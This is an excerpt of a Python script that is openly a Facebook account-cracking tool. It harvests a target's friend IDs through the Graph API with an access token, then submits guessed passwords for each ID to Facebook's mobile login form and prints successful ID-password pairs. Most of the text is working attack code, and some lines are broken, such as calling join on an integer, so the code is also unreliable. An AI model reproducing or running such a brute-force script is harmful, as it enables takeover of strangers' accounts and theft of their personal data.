...
def banner():
 ...
 | \| |_ _| |/ / || |_ _| |    |   \| | | | \| |
 | .` || || ' <| __ || || |__  | |) | |_| | .` |
 |_|\_|___|_|\_\_||_|___|____| |___/ \___/|_|\_| V2
------------------------------------------------------- Author    : NIKHIL BAP
 Github    : NIKHILBABE
...
class teman_teman:
    def __init__(self):
        ...
        if pl in ['1','01','m','M','a']:
            ...
            self.files = ('preshakdump%s.txt'%(self.target))
            ...
            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={tokenku}'
            self.files = ('preshakdumpnew%s.txt'%(self.target))
            file_dump = self.files
            open(self.files,'w').write('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[NEPAL]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}][{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = ("N-") + (101).join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				ok+=1
				coki=po.cookies.get_dict()
				kuki = ("N-+") + (101).join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}[NEPAL-OK]  {idf} {pw}')
